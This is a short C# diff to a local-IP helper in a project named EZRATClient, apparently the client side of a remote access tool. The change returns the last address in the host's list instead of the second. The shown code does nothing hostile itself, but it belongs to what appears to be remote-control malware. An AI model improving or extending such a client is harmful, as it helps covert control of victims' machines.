@@ -17,7 +17,7 @@ namespace EZRATClient.Utils
             string hostName = Dns.GetHostName(); // Retrive the Name of HOST
             // Get the IP  
             IPAddress[] tmp = Dns.GetHostByName(hostName).AddressList;
-            return tmp[1].ToString();
+            return tmp[tmp.Length - 1].ToString();
             throw new Exception("No network adapters with an IPv4 address in the system!");
         }
 
